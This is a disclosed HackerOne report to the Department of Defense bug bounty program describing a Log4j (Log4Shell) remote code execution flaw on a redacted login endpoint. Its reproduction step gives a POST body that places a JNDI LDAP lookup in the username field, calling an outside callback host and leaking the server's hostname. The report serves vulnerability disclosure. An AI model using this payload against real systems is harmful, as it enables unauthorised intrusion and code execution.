# ██████_log4j - https://██████

## Report Details
- **Report ID**: 1631364
- **URL**: https://hackerone.com/reports/1631364
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2022-07-08T13:59:08.921Z
- **Disclosed**: 2022-09-06T19:07:13.913Z

## Reporter
- **Username**: hachimanxienim
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
Hi security team, i found a log4j vulnerability in your aplication

## Impact

Logging untrusted or user controlled data with a vulnerable version of Log4J may result in Remote Code Execution (RCE) against your application. This includes untrusted data included in logged errors such as exception traces, authentication failures, and other unexpected vectors of user controlled input.

## System Host(s)
███████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
Send POST request to this endpoint --->  https://██████/mifs/j_spring_security_check


the post request: 

j_username=${jndi:ldap://${hostName}.youinteractsserver}&j_password=password&logincontext=employee

## Suggested Mitigation/Remediation Actions




## Attachments
No attachments
